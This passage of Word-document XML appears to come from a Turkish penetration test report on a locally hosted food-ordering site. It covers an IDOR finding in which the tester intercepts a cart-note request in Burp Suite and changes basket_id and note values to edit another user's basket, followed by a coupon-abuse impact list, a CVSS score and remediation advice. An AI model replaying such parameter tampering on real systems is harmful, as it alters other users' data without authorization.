          <w:p w14:paraId="0992FAC5" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00950946" w:rsidRDefault="00081BEE" w:rsidP="00081BEE">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:spacing w:before="240" w:after="160" w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A80369">
              <w:t>Güçlü Doğrulama ve Yetkilendirme Kontrolleri:</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Güvenli bir kullanıcı doğrulama ve yetkilendirme mekanizması oluşturulmalıdır. Kullanıcıların erişebileceği nesneler, etkili kontrollerle doğrulanmalı ve yetkilendirilmelidir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66AAFC34" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00950946" w:rsidRDefault="00081BEE" w:rsidP="00081BEE">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:spacing w:before="240" w:after="160" w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A80369">
              <w:lastRenderedPageBreak/>
              <w:t>Referans Kontrolleri ve Doğrulama:</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Nesnelere erişim sırasında, referanslar arasında etkili doğrulama yapılmalıdır. Bu, kullanıcının erişim izinlerini sürekli olarak kontrol etmek için önemlidir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="489A5046" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00FD2D0C" w:rsidRDefault="00081BEE" w:rsidP="00081BEE">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FD2D0C">
              <w:t>Eşsiz Kimlikler ve Doğrulama Kodları:</w:t>
            </w:r>
            <w:r w:rsidRPr="00FD2D0C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> Güvenli bir referans sistemi oluşturmak adına nesnelere eşsiz kimlikler veya doğrulama kodları eklenmelidir. Bu yöntem, yetkisiz erişimleri önlemeye yardımcı olabilir.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00081BEE" w14:paraId="11E32C9F" w14:textId="77777777" w:rsidTr="00C20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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="093002AC" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Zafiyetin Doğurabileceği Sonuçlar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00081BEE" w14:paraId="56EFDAA8" w14:textId="77777777" w:rsidTr="00C20FA7">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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="533382B6" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00856007" w:rsidRDefault="00081BEE" w:rsidP="00081BEE">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Yetkisiz Kupon Ekleme</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Bir restoran sahibi, IDOR zafiyeti nedeniyle başka restoranların kuponlarını ekleyebilir. Bu, haksız rekabet yaratabilir veya mali kayıplara neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A2A6DBC" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00856007" w:rsidRDefault="00081BEE" w:rsidP="00081BEE">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Kuponların Suistimali :</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Bir kullanıcı, başka restoranlar için geçerli olan kuponları kendine veya başkalarına avantaj sağlamak için kullanabilir. Bu durum, gelir kaybına ve müşteri güveninin sarsılmasına neden olur.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48C0BB89" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00856007" w:rsidRDefault="00081BEE" w:rsidP="00081BEE">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Gelir Kaybı ve İtibar Zedelenmesi</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Kupon sisteminde yapılan yetkisiz değişiklikler, işletmeler için büyük mali kayıplara yol açabilir. Ayrıca, sistemin güvenliğinin sorgulanması itibar kaybına neden olabilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24E74286" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRDefault="00081BEE" w:rsidP="00081BEE">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00081BEE" w:rsidRPr="00402B96" w14:paraId="1A34C888" w14:textId="77777777" w:rsidTr="00C20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4AA43FEA" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:keepNext/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>CVSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00081BEE" w:rsidRPr="00402B96" w14:paraId="21A30305" w14:textId="77777777" w:rsidTr="00C20FA7">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="75FDB8AF" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00C361DB" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>4.3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00081BEE" w:rsidRPr="00402B96" w14:paraId="6D4CB066" w14:textId="77777777" w:rsidTr="00C20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05B78A99" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00402B96" w:rsidRDefault="00081BEE" w:rsidP="00C20FA7">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="32182853" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00593C92" w:rsidRDefault="00081BEE" w:rsidP="00081BEE"/>
    <w:p w14:paraId="63CFC7F3" w14:textId="77777777" w:rsidR="00081BEE" w:rsidRPr="00593C92" w:rsidRDefault="00081BEE" w:rsidP="00081BEE"/>
    <w:p w14:paraId="61C320CB" w14:textId="390E65F7" w:rsidR="003220EF" w:rsidRDefault="003220EF" w:rsidP="003220EF">
      <w:pPr>
        <w:pStyle w:val="Balk1"/>
      </w:pPr>
      <w:r>
        <w:t>10</w:t>
      </w:r>
      <w:r>
        <w:t>) IDOR</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="ListeTablo4-Vurgu6"/>
        <w:tblW w:w="9214" w:type="dxa"/>
        <w:tblInd w:w="-34" w:type="dxa"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9214"/>
      </w:tblGrid>
      <w:tr w:rsidR="003220EF" w14:paraId="19EA31C5" w14:textId="77777777" w:rsidTr="000B1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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15CDF985" w14:textId="77777777" w:rsidR="003220EF" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>Zafiyet Adı</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003220EF" w14:paraId="0CEE39E7" w14:textId="77777777" w:rsidTr="000B1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left w:val="single" w:sz="4" w:space="0" w:color="FABF8F" w:themeColor="accent6" w:themeTint="99"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="48840CDC" w14:textId="77777777" w:rsidR="003220EF" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>IDOR</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003220EF" w14:paraId="10AB7445" w14:textId="77777777" w:rsidTr="000B1BB4">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tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2A300E90" w14:textId="77777777" w:rsidR="003220EF" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:spacing w:before="240"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003220EF" w:rsidRPr="00057867" w14:paraId="2DB7DD60" w14:textId="77777777" w:rsidTr="000B1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1C983942" w14:textId="77777777" w:rsidR="003220EF" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyet Açıklaması</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16D969AD" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00BF4DE0" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003220EF" w:rsidRPr="00057867" w14:paraId="20E6AA0D" w14:textId="77777777" w:rsidTr="000B1BB4">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="01B48951" w14:textId="540DF060" w:rsidR="003220EF" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="both"/>
            </w:pPr>
            <w:hyperlink r:id="rId49" w:history="1">
              <w:r w:rsidRPr="002D6E05">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>http://127.0.0.1/login.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>adresine gidilir ve</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidR="001E0913">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>kullanıcı</w:t>
            </w:r>
            <w:r w:rsidRPr="00EE6B0D">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> giriş yapılır.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">  Ardından </w:t>
            </w:r>
            <w:hyperlink r:id="rId50" w:history="1">
              <w:r w:rsidR="001E0913" w:rsidRPr="007B7ED6">
                <w:rPr>
                  <w:rStyle w:val="Kpr"/>
                </w:rPr>
                <w:t>http://127.0.0.1/customer_cart.php</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="001E0913">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> adresine gidilir. </w:t>
            </w:r>
            <w:r w:rsidR="001E0913">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Sepetteki l</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">istelenen </w:t>
            </w:r>
            <w:r w:rsidR="001E0913">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>y</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">emeklerde herhangi bir tanesinin </w:t>
            </w:r>
            <w:r w:rsidR="001E0913">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Not Güncelle</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> butonuna tıklanır ve istek burpsuite Proxy aracı ile tutulur</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="060488F3" w14:textId="56FEC774" w:rsidR="003220EF" w:rsidRDefault="001E0913" w:rsidP="000B1BB4">
            <w:pPr>
              <w:keepNext/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001E0913">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="07369A8A" wp14:editId="54D35B1A">
                  <wp:extent cx="5713730" cy="2037715"/>
                  <wp:effectExtent l="0" t="0" r="1270" b="635"/>
                  <wp:docPr id="95788265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882653" name=""/>
                          <pic:cNvPicPr/>
                        </pic:nvPicPr>
                        <pic:blipFill>
                          <a:blip r:embed="rId51"/>
                          <a:stretch>
                            <a:fillRect/>
                          </a:stretch>
                        </pic:blipFill>
                        <pic:spPr>
                          <a:xfrm>
                            <a:off x="0" y="0"/>
                            <a:ext cx="5713730" cy="2037715"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w14:paraId="77067F4F" w14:textId="45E3E2AB" w:rsidR="003220EF" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A1CC9">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t>Görsel -  1</w:t>
            </w:r>
            <w:r w:rsidR="00521C03">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
            <w:r w:rsidRPr="005A1CC9">
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
              <w:t xml:space="preserve"> Yakalanan İstek</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F4EF0E6" w14:textId="2258FC3E" w:rsidR="003220EF" w:rsidRPr="00081BEE" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">Yakalanan istekte </w:t>
            </w:r>
            <w:r w:rsidR="001E0913" w:rsidRPr="001E0913">
              <w:t>basket_id=</w:t>
            </w:r>
            <w:r w:rsidR="001E0913">
              <w:t>4</w:t>
            </w:r>
            <w:r w:rsidR="001E0913" w:rsidRPr="001E0913">
              <w:t>&amp;note=</w:t>
            </w:r>
            <w:r w:rsidR="001E0913">
              <w:t xml:space="preserve">DENEME36 </w:t>
            </w:r>
            <w:r w:rsidR="001E0913">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">parametreleri sırasıyla 2 ve “TESTBASKET” </w:t>
            </w:r>
            <w:r w:rsidR="001E0913">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">değerleri ile değiştirilerek başka bir kullanıcının sepetindeki ürünün notu  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">başarıyla </w:t>
            </w:r>
            <w:r w:rsidR="001E0913">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>değiştirilir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="227C982D" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00CF0A67" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:pStyle w:val="ResimYazs"/>
              <w:rPr>
                <w:color w:val="auto"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003220EF" w:rsidRPr="00057867" w14:paraId="1490E837" w14:textId="77777777" w:rsidTr="000B1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4C1674F0" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00057867" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Çözüm Önerisi</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003220EF" w:rsidRPr="00D60321" w14:paraId="1C324E51" w14:textId="77777777" w:rsidTr="000B1BB4">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FFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="16295555" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00950946" w:rsidRDefault="003220EF" w:rsidP="003220EF">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:spacing w:before="240" w:after="160" w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A80369">
              <w:t>Güçlü Doğrulama ve Yetkilendirme Kontrolleri:</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Güvenli bir kullanıcı doğrulama ve yetkilendirme mekanizması oluşturulmalıdır. Kullanıcıların erişebileceği nesneler, etkili kontrollerle doğrulanmalı ve yetkilendirilmelidir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4ABB5F11" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00950946" w:rsidRDefault="003220EF" w:rsidP="003220EF">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:spacing w:before="240" w:after="160" w:line="360" w:lineRule="auto"/>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A80369">
              <w:t>Referans Kontrolleri ve Doğrulama:</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00950946">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t>Nesnelere erişim sırasında, referanslar arasında etkili doğrulama yapılmalıdır. Bu, kullanıcının erişim izinlerini sürekli olarak kontrol etmek için önemlidir.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="113AEA11" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00FD2D0C" w:rsidRDefault="003220EF" w:rsidP="003220EF">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:keepNext/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="10"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00FD2D0C">
              <w:t>Eşsiz Kimlikler ve Doğrulama Kodları:</w:t>
            </w:r>
            <w:r w:rsidRPr="00FD2D0C">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> Güvenli bir referans sistemi oluşturmak adına nesnelere eşsiz kimlikler veya doğrulama kodları eklenmelidir. Bu yöntem, yetkisiz erişimleri önlemeye yardımcı olabilir.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003220EF" w14:paraId="1ED74B85" w14:textId="77777777" w:rsidTr="000B1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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="4F81BD" w:themeFill="accent1"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="50F33F7C" w14:textId="77777777" w:rsidR="003220EF" w:rsidRDefault="003220EF" w:rsidP="000B1BB4">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
              </w:rPr>
              <w:t>Zafiyetin Doğurabileceği Sonuçlar</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="003220EF" w14:paraId="4C2E20FB" w14:textId="77777777" w:rsidTr="000B1BB4">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bottom w:val="single" w:sz="8" w:space="0" w:color="FFFFFF"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="92D050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
          </w:tcPr>
          <w:p w14:paraId="4478EE21" w14:textId="77777777" w:rsidR="003220EF" w:rsidRPr="00856007" w:rsidRDefault="003220EF" w:rsidP="003220EF">
            <w:pPr>
              <w:pStyle w:val="ListeParagraf"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="14"/>
              </w:numPr>
              <w:jc w:val="both"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00856007">
              <w:t>Yetkisiz Kupon Ekleme</w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve">: </w:t>
            </w:r>
            <w:r w:rsidRPr="00856007">
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
